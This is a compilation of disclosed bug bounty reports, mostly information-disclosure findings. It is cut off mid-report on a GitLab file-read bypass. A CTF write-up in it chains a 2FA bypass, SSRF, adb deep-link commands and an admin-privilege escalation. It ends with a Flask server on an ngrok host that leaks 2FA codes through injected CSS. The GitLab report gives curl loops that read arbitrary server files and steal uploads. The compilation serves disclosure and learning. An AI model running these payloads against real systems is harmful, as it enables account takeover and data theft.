If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.

Resources:

https://portswigger.net/kb/issues/00300200_external-service-interaction-dns#:~:text=Description%3A%20External%20service%20interaction%20(DNS,a%20web%20or%20mail%20server.&text=The%20ability%20to%20send%20requests,used%20as%20an%20attack%20proxy.

## Impact

The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.

---

### [Uninitialized read in exif_process_IFD_in_MAKERNOTE](https://hackerone.com/reports/516237)

- **Report ID:** `516237`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Internet Bug Bounty
- **Reporter:** @chamal
- **Bounty:** - usd
- **Disclosed:** 2020-10-10T02:17:45.672Z
- **CVE(s):** CVE-2019-9638

**Vulnerability Information:**

This bug is present in exif_process_IFD_in_MAKERNOTE method of ext/exif/exif.c file.

Detailed description and steps to reproduce for this bug is present in bug report submitted to php.net.
Bug Report : https://bugs.php.net/bug.php?id=77563
PHP version : 7.1.26
CVE-ID : 2019-9638

## Impact

Uninitialized data may leak data from memory.

---

### [Open SonarQube instance leaking internal source code](https://hackerone.com/reports/947946)

- **Report ID:** `947946`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Equifax-vdp
- **Reporter:** @aksquare
- **Bounty:** - usd
- **Disclosed:** 2020-09-03T05:59:14.045Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary
I came across an open SonarQube instance which can be found here: http://34.238.92.229:9000/
In this, there are 10 projects with a total of around 100k lines of code
To identify the owner, I went to the Issues tab and expanded the list of authors. There were 29 people there, and many of them were Equifax employees (I reached this conclusion because they have @equifax.com email id). 
Some of the projects there in the instance are related to authentication and APIs. One of the largest projects there is called zoomv2
Owing to the sensitive nature of the leakage, I did not dig deeper through the source code, however, I believe that this much information is enough for a POC. However, if you need more information, then I will be happy to dig through the source code there and give specific examples of how the information can be misused.

# Steps to recreate:
1. Go to http://34.238.92.229:9000/
2. There you can click on the issues tab, and then on the bottom left corner, click on Author
3. You will see a list of people who have contributed to the projects and can confirm that many of the people are Equifax employees
4. Go to Projects tab and see all the projects and their source code that are leaked 

# Fix
Put the instance behind a login screen, and check if unauthorised users have accessed this instance. If possible revoke access to any API keys or other credentials that were exposed in this instance

*I understand that there were other people from other companies in this instance too, and that this might not be an instance owned by Equifax. However, even though Equifax was not the owner, it still is involved with this particular instance, and thus I decided to report it to you.

## Impact

SonarQube is used to automate finding issues and vulnerabilities in source code. By leaving this instance open, an attacker can get access to all the source code, the issues, and the vulnerabilities that the particular code has. If this code is in a production environment, then this information is extremely dangerous. And even if the project is not in production, this kind of information can have internal APIs, IPs and other sensitive data that can be taken advantage of in other ways.

---

### [Sensitive Information Disclosure](https://hackerone.com/reports/963352)

- **Report ID:** `963352`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Dropcontact
- **Reporter:** @akashhamal0x01
- **Bounty:** - usd
- **Disclosed:** 2020-08-21T13:19:49.803Z
- **CVE(s):** -

**Summary (team):**

we were displaying sensitive information.

**Summary (researcher):**

While testing the site i was able to disclose sensitive information such as username, passwords, api keys, etc due to DEBUG = True .This bug arose due to default configuration at the backend. Now the bug is fixed. Thanks to  the team for the quick fix!

---

### [Dropcontact's disclosed report is exposing Private/Confidential information](https://hackerone.com/reports/963327)

- **Report ID:** `963327`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Dropcontact
- **Reporter:** @n1m0
- **Bounty:** - usd
- **Disclosed:** 2020-08-20T16:16:01.494Z
- **CVE(s):** -

**Summary (team):**

Some other report was disclosed fully with confidential information !

---

### [Default Creds Spring Boot Admin](https://hackerone.com/reports/954818)

- **Report ID:** `954818`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** 8x8
- **Reporter:** @testingforbugs
- **Bounty:** - usd
- **Disclosed:** 2020-08-14T17:01:38.506Z
- **CVE(s):** -

**Summary (team):**

An instance hosting Spring Boot Admin was left exposed with default credentials set.

---

### [S3 bucket data at http://rockset-support.s3-us-west-2.amazonaws.com/ reveals user addresses based on latitudes and longitudes.](https://hackerone.com/reports/947725)

- **Report ID:** `947725`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rockset
- **Reporter:** @boy_child_
- **Bounty:** - usd
- **Disclosed:** 2020-08-05T14:38:57.976Z
- **CVE(s):** -

**Vulnerability Information:**

At the s3 bucket located at http://rockset-support.s3-us-west-2.amazonaws.com/, a file was found called ``data.json.15``that contains of interest latitudes and latitudes of user addresses.
{F930036}

**Steps to reproduce:**
1, Download the file in the bucket with the command:
```
aws s3 sync s3://rockset-support .
```
2. Open the file labelled ``data.json.15``.
3. For each line, there will be a set of latitudes and longitudes. Copy a single pair. 
{F930037}

4. Open Google Maps, enter the coordinates and click search.
{F930058}

## Impact

Specific user location information violates the privacy policy stated by Rockset for its users allowing both targeted phishing attacks and physical risk.

---

### [Hardcoded credentials in Android App](https://hackerone.com/reports/412772)

- **Report ID:** `412772`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** 8x8
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T21:15:35.339Z
- **CVE(s):** -

**Summary (team):**

The mobile applications contained a URL that included credentials to a third party bug capture API. Access was restricted to pushing bug information.

---

### [Source code disclosure at ███](https://hackerone.com/reports/902322)

- **Report ID:** `902322`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** RATELIMITED
- **Reporter:** @0xd0ff9
- **Bounty:** - usd
- **Disclosed:** 2020-06-20T01:21:14.189Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Source code disclosure at ███████

## Steps To Reproduce:
POC: link download source code: ███████

## Supporting Material/References:
█████
███████

## Impact

Source Code Disclosure
Sensitive Information Disclosure

---

### [[h1-2006 CTF] Payments for May have been processed!](https://hackerone.com/reports/894165)

- **Report ID:** `894165`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @vakzz
- **Bounty:** - usd
- **Disclosed:** 2020-06-19T21:47:57.062Z
- **CVE(s):** -

**Vulnerability Information:**

Hi :)

First off thanks for a great CTF!  It had its ups and downs (mainly due to my mistakes) but here is the final flag: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

My write up can be found at https://devcraft.io/bountypay-h1-2006-ctf.html (unpublished) detailing the process, tools, and mistakes I made along the way.

Cheers,
Will

## Impact

* Password disclosure and multiple 2FA bypasses allowing an attacker to process payments

---

### [h1-ctf writeup , finally paid the payments by chaining multiple bugs](https://hackerone.com/reports/894110)

- **Report ID:** `894110`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @d1r3wolf
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:28:49.496Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
Ultimate aim is to pay the payments of hackerone using bounty pay with no use privileges at starting.
Given scope is : *.bountypay.h1ctf.com

**Enumerated subdomains are :**
  1. www.bountypay.h1ctf.com
  2. app.bountypay.h1ctf.com
  3. staff.bountypay.h1ctf.com
  4. api.bountypay.h1ctf.com
  5. software.bountypay.h1ctf.com (cant access gloabally)

The overall CTF can be divided into levels, at each level we work with one subdomain.
**Lets make the road map to the CTF:**
  1. Login into the **app.bountypay.h1ctf.com** (using **git repo files**, 2FA bypass)
  2. **SSRF** in **load transactions** to access **software.bountypay.h1ctf.com** and getting **BountyPay.apk**
  3. Solving the **three challenges** of Android to get **api key** of **api.bountypay.h1ctf.com**
  4. Recon on the **company twitter** to get the staff_id , finding the creds of **staff.bountypay.h1ctf.com** using that **staff id** and staff details route over **api**
  5. Getting **hackerone** payment creds by **upgrading to admin** using **report feature** and **chaining the logical bugs** over predifined js 
  6. Leaking the **2FA code** by **CSS exfilteration** and bypass 2FA at payments on **app.bountypay.h1ctf.com**
  
# Level - 1 :: 
Started with app.bountypay.h1ctf.com site.
Through dirsearch found the git repo files **/.git/**, downloaded the config file https://app.bountypay.h1ctf.com/.git/config
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```
Through the config file found the git repo https://github.com/bounty-pay-code/request-logger.git.
The repo is php request logger .
through the [logger.php code](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php)
```php
<?php
$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);
file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```
 found that it logs the POST and GET variables to the log file **bp_web_trace.log** which is in htdocs and can be accessed through server https://app.bountypay.h1ctf.com/bp_web_trace.log.
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```
By base64 decoding we can get the first four requests of the server
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
Using that creds we can login into the app.bountypay.h1ctf.com which has an 2FA check.
There is no session management, 2FA code is validated using the challenge parameter so 2FA is validated using some relation ship between challenge and challenge_answer.
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com

username=brian.oliver&password=V7h0inzX&challenge=4810310b2c844799dc9c9d46d3838192&challenge_answer=fake
```
Seems like the `challenge == md5(challenge_answer)`, tried that one `challenge=144c9defac04969c7bfad8efaa8ea194&challenge_answer=fake`
Worked : )    -   Successfully logged into app.app.bountypay.h1ctf.com

# Level - 2 ::
After login into the **app.bountypay.h1ctf.com**, it gives a **dashboard** where we can **load transactions based on month, year and pay them**.
The brian.oliver is the owner of BountyPayHQ , searched for all months and years, no use, there are no payments for that account.
But while loading transactions :
{F859504}
It giving a **url of  api to get the result** and **result data** in the json.
The server is **internally requesting the api** for the result. we can achieve **SSRF** if we have control over the url.
URL : `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=07&year=2020`
There is no use of **month and year values** as they are in the **query part**, but after observing the base64 cookie found that the account id **F8gHiqSdpK** has been taken from **token cookie**.
```
$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
As we have control over account_id, the injection is in url path, so we can control path over that domain api.bountypay.h1ctf.com only : (.

After visiting the [home page](https://api.bountypay.h1ctf.com/) found that there is an redirect at https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API
url has an **whitelist check**, but it is accepting https://software.bountypay.h1ctf.com/, which is not accessable globally. 
Tried accessing it using ssrf : F859521
It has a login page same as app.bountypay.h1ctf.com , tried sending post params in get etc, nothing worked.
After that tried directory brute force using that ssrf, found uploads directory on https://software.bountypay.h1ctf.com/. 
```<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```
Found the apk on the uploads folder, the files has no restrictions for IP. so downloaded it normally https://software.bountypay.h1ctf.com/uploads/BountyPay.apk .  Apk file : F859556

# Level - 3 :: 
Decompiled the Apk into java files
And found that Three challenges in Apk (PartOneActivity.java, PartTwoActivity.java , PartThreeActicity.java).
For each activity there is a deep link, the challenges are just fullfill conditions using deeplinks
```xml
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="three" android:host="part"/>
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="two" android:host="part"/>
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="one" android:host="part"/>
            </intent-filter>
        </activity>
```
## First challenge :
```java
     if (getIntent() != null && getIntent().getData() != null) {
            String firstParam = getIntent().getData().getQueryParameter("start");
            if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(str)) {
```
It just checks there is start param in query on deep link and that param value == PartTwoActivity
Solution : 
```
$ adb shell am start -d one://part?start=PartTwoActivity
```
## Second Challenge 
```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("two");
    String secondParam = data.getQueryParameter("switch");
    if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
```
It checks two and switch params must be in query and the values must be `two=light&switch=on`
Solution : 
```
$ adb shell am start -d 'two://part?two=light\&switch=on'
```
After that there is question where it ask for header value and combine it with `X-` and checks with header value of firebase.
From internal files of firebase in apk found the url for firebase https://bountypay-90f64.firebaseio.com/
Then getting the header value in it, https://bountypay-90f64.firebaseio.com/header/.json  `Token` is the value, submit it

## Third Challenge
Where as PartThreeActivity it checks for `three=base64(PartThreeActivity)` and `switch=base64(on)` and `header=X-Token`
Solution : 
```
$ adb shell am start -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token'
```
To finish this we need google apps in VM, as firebase requires aiuthentication.
It saves the Token and Host values to shared preferences.
```
$ adb shell
root@vbox86p:/ # cat /data/data/bounty.pay/shared_prefs/user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="TWITTERHANDLE"></string>
    <string name="USERNAME">Hello</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
</map>
root@vbox86p:/ # 
```
Now we got the token. we can submit it dialogue box that asks after we launch third activity to make it finish F859607.
From the **performPostCall** function of **PartThreeActivity.java** we can get to know how to use the token
`X-Token: 8e9998ee3137ca9ade8f372739f062c1` as a header for api.bountypay.h1ctf.com


# Level - 4 ::
After getting the api token. crawled over the api recursively and only one useful new route `/api/staff`
```
_______________________________ Request __________________________________
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Connection: close

_______________________________ Response __________________________________
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```
After few trails over that request , found it resonds to POST method , which takes staff_id as input.
If already knows staff_id from GET method is used it is responding as `Staff Member already has an account`
For non existing staff_id's `Invalid Staff ID`

This is most difficult part i faced, didn't expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.  
We need a new joining staff_id to create an account.
**Recon part**
Gone to twitter https://twitter.com/BountypayHQ
There is a tweet : `Today we welcome Sandra to the team!!!` it is hint for us.
Searched for following of BountypayHQ in twitter and find sandra twitter account https://twitter.com/SandraA76708114
There she posts a tweet of first day job https://twitter.com/SandraA76708114/status/1258693001964068864.
Where the photo contains the ID card which has an staff_id on it F859634.

**Staff id**: STF:8FJ3KFISL3
with which we can create new account to get staff credentials.
```
_______________________________ Request __________________________________
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23

staff_id=STF:8FJ3KFISL3
_______________________________ Response __________________________________
 {"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```
It creates a new account and gives the username, password of sandra.
Username: sandra.allison
Password: s%3D8qB8zEpMnc*xsz7Yp5

# Level - 5 :: 
Using those **staff creds** we can login to **staff.bountypay.h1ctf.com**
Through the js file(https://staff.bountypay.h1ctf.com/js/website.js) we can observer there is upgrade to admin concept
```js
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), 
$(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), 
$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), 
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```
## Observation-1:
**upgradeToAdmin** is not working for us, **requires admin privilages**.
There is a **report functionality** is dashboard , we might use that to trigger the upgrade functionality on **admin side**.
The report to admin request takes only **path of the url**
```
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV............
```
We have to trigger the upgrade to admin functionality locally only by the url.

Observation-2:
As the **avatar** is linked to the **class names** (avatar1, avatar2, avatar2). our **input for avatar** is **simple a class name**.
So there is an **class injection in avatar**. It supports **multiple classes** as it allows space char.
We can trigger that class injection on `/?template=home` and `/?template=ticket&ticket_id=3582`

Observation - 3:
**upgrade to  admin** function has been linked to on click listner on **upgradeToAdmin class**
Based on last line of website.js
```js
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```
We can **trigger onclick** using **hash and class names**, as already we have class names in our control for a div.
We can set the **class name** as `tab4 upgradeToAdmin` and **hash** as `#tab4` , which first makes the **div to click** based on **.tab4 class name** 
As the **div also had upgradeToAdmin class**, now it triggers the upgradetoadmin function .

Observation - 4:
```js
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
```
It is taking the **username** from `input[name="username"]`, we need to find that type of gadget in html.
after checking all **templates** , **login template had that gadget**, weirdly there is no check for opening of login template even after loggedin.
we need to **fill the username** field with our disired value only with url, tried with get params https://staff.bountypay.h1ctf.com/?template=login&username=nice , Worked : )

Observation - 5:
But the **login template** didn't have **class injection**, we need both **login, ticket template** to make this happen.
As the template is based on get param, tried giving of multiple templates as array . Worked : )

Finally: 
By combining all
Change the avatar value to `tab4 upgradeToAdmin`
```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUV....

profile_name=sandra&profile_avatar=tab4 upgradeToAdmin
```
Open : https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra&template[]=ticket&ticket_id=3582#tab4
Observer the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.
```
$ echo -n "/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4" | base64
Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlj
a2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=
```
Visit the URL : https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=

It gives the new admin tab to the dashbaord.
{F859704}
Which contains passwords of bounty pay accounts. now we got the username and password of hackerone's bountypay account.
```
Username: marten.mickos
Password : h&H5wy2Lggj*kKn4OD&Ype
```

# Level - 6 ::
 Now we can login to hackerone's bounty pay account using those creds on **app.bountypay.h1ctf.com**, using 2FA bypass trich , that we did on level -1
Load the **transaction of May 2020**, we need to **pay them** in order to **finish the challellege**.
Payment : https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
To pay there is an send challenge option. Which sends code to 2FA app. that request also takes `app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`
By changing the value, we can load **our style** for that 2FA code. Now our aim is to leak the **7 digit 2FA** code using **CSS exfilteration**.

After some trails with **tag names** using **responsive nature of css** (background image), tried **input** tag. It responded with **7 requests**.
Now tried to brute force the **input tag's name **. Upto `code_` there comes only **one request**.
After that it responded with **1 to 7 values**. then got to understand the **pattern of input name** like code_1, code_2, code_3, code_4, code_5, code_6, code_7.
We need to **leak all those seven codes**. As there is **each input for each code**. it became quite simple for bruteforce.
## Final payload server using ngrok.
```python
from flask import *
from flask_cors import CORS, cross_origin
from requests import *

app = Flask(__name__,static_folder='')
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

@cross_origin()
@app.route("/css/final.css")
def css_file():
	return app.send_static_file("check.css")

record_file="/tmp/record_%s.txt"

@app.route("/recieve")
@cross_origin()
def recieve():
	char = request.args.get('char') ; place = request.args.get('place')
	print(place,' - ',char)
	return "Done"

def set_payload(payload):
	final = open("check.css",'a+'); string =""
	PP = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~ "
	for p in PP:
		string += str(payload).replace("$$",p).replace("||",str(ord(p)))
	final.write(string)
	final.close()

ngrok_url = "https://87dc2cffc13b.ngrok.io"
payload = '''
input[name^="code_!!"][value="$$"] {
	background-image:url("%s/recieve?value=||&char=$$&place=!!");
}
'''%ngrok_url

if __name__ == '__main__':
	with open("check.css",'w') as F: pass
	for i in range(1,8):
		temp = payload.replace('!!',str(i))
		set_payload(temp)
	app.run()
```
Just **intercept** the request of **send_challenge (send 2FA)** and **change the app_style** to https://87dc2cffc13b.ngrok.io/css/final.css.
From **python server log** we can get the **7 digits**, we need to **combine and enter on the site**. we have enough time for this [**2 min**]
**Boom : )**

# Proof of concept
Here is the flag : ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
Screenshot : F859448

## Impact

Access over payments account.

---

### [[H1-2006 2020] H1-2006 CTF Writeup](https://hackerone.com/reports/887611)

- **Report ID:** `887611`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @nytr0gen
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:25:02.153Z
- **CVE(s):** -

**Vulnerability Information:**

Hi! 

The challenges were really great. I had a lot of fun and I can honestly say I learned a few tricks during this journey.

I will be submitting the flag now and will work on a very good writeup until the deadline. My reasoning is that there are two different prizes, one for the first ten and another prize for the best writeup, and I would like to qualify to both. And also I'm really tired to do the writeup right now :)))

```
^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
```

{F849250}

## Impact

.

---

### [Sensitive data disclosure via exposed phpunit file](https://hackerone.com/reports/543775)

- **Report ID:** `543775`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** 8x8
- **Reporter:** @l34r00t
- **Bounty:** - usd
- **Disclosed:** 2020-06-09T19:53:53.443Z
- **CVE(s):** -

**Summary (team):**

Several domains with the development phpunit configuration files exposed without proper restrictions.

---

### [gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read](https://hackerone.com/reports/850447)

- **Report ID:** `850447`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 10000 usd
- **Disclosed:** 2020-06-08T04:57:08.889Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
Extracted from https://hackerone.com/reports/835455#activity-7672566

While testing and looking at the patch for the nuget package workhorse bypass (https://gitlab.com/gitlab-org/gitlab/issues/209080 I think) I came across a more widespread bypass:

```bash
# create test file on gitlab server
echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg

# attacker
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"

{"message":"201 Created"}
```

Using `[package]` as the field name causes the `@rewritten_fields` to contain:

```json
{
  "rewritten_fields": {
    "[package]": "/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799"
  },
  "iss": "gitlab-workhorse"
}
```
This is then used `parsed_field = Rack::Utils.parse_nested_query(field)` which ends up creating the hash `{"package"=>nil}` (same as package would return). This passes the validation, but the `Multipart::Handler` will then use the query params as they match instead of the payload that workhorse sends through.

This also allows for any file in the following to be accessed:

```ruby
       def allowed_paths
          [
            ::FileUploader.root,
            Gitlab.config.uploads.storage_path,
            JobArtifactUploader.workhorse_upload_path,
            File.join(Rails.root, 'public/uploads/tmp')
          ]
        end
```

This could be done anywhere that accelerated uploads, eg the `UploadsController` or uploading a wiki file.

Using the wiki api removes the restriction that the file needs to be owned by `git` due to `file_content: attrs[:file].read` happening instead of moving the original file:

```bash
echo hello > /tmp/ggg; sudo chown root:root /tmp/ggg

$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'

{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
```

It's also fairly easy to steal incoming files tmp files that are currently opened in rails by:

1. Determine a valid PID by looping over `/proc/PID` until a `cwd` is found and readable by `git` (eg the `unicorn` worker will have `/proc/19606/cwd -> /var/opt/gitlab/gitlab-rails/working`) and traverse to a valid upload path:

    ```bash
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
500
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
201
    ```

1. Using this pid, use `/proc/PID/fd/XX` as the `file.path` (looking at my server a fd of 44 was the used pretty consistently for tmp files) and run it in a loop:

    ```bash
$ while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done
    ```

1. Upload a bunch of things, eventually a file will be stolen:

    ```json
{"file_name":"image.png115893730","file_path":"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730","branch":"master","link":{"url":"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730","markdown":"[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)"}}
    ```

### Steps to reproduce

1. create a new project
1. create a wiki page
